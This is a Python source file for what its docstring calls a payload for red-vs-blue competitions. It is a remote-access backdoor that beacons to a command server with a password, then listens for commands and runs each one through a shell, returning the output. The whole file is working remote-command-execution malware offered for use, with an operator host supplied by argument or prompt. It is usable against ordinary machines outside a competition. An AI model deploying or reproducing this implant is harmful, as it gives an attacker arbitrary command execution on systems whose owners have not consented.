import socket
import shlex
from subprocess import Popen, PIPE

"""
This is a payload which starts a listener on port 22705 and signals
to command machine at an IP which is predefined or specified in args.
This signal makes the command server create channels on discord for
logging, monitoring, and remote execution on this machine.

Intended for red vs blue competitions.

Author: Asa Horn
"""
############################################################helper functions
#shamelessly stolen from stack overflow
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        print('target fingerprint failed')
        IP = '0.0.0.0'
    finally:
        s.close()
    return IP


###############################################################Main
def main(*args):
    controllerIP = ''
    password = ''

    if password == '':
        if len(args) > 1:
            password = args[1]
        else:
            password = input('Password for beacon: ')

    if controllerIP == '':
        if len(args) == 3:
            controllerIP = args[2]
        else:
            controllerIP = input('Please provide command IP or hostname: ')

    ####### init
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send greeting to command server
        s.connect((controllerIP, 22704))
        beacon = 'CONNECT: ' + password  #the security here leaves a lot to be desired but AES is annoying

        print('Attempting to beacon command server')
        s.sendall(bytes(beacon, 'utf-8'))
        data = s.recv(1024)
        if data == b'ACCEPTED':
            print('Login acknowledged by command server, awaiting instructions...')
        elif data == b'BAD CRED':
            print('Password rejected by command server, please try again')
            exit(10)
        else:
            print('Unknown error with beacon connection. Message:\n' + repr(data))
            exit(20)

    ####### main loop
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #await instructions from server
            s.bind((controllerIP, 22705))
            s.listen()
            conn, addr = s.accept()
            with conn:
                print('Command connection from', addr)
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print('Command received ' + data.decode("utf-8"))
                    command = shlex.split(data.decode("utf-8"))
                    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
                    stdout, stderr = process.communicate()
                    print('sending back """\n' + stdout.decode("utf-8"), stderr.decode("utf-8"), '"""\n\n')
                    if stderr:
                        conn.sendall(stderr)
                    elif stdout:
                        conn.sendall(stdout)
                    else:
                        conn.sendall(b'The command completed successfully with no output')

    ####### clean up


if __name__ == '__main__':
    main()
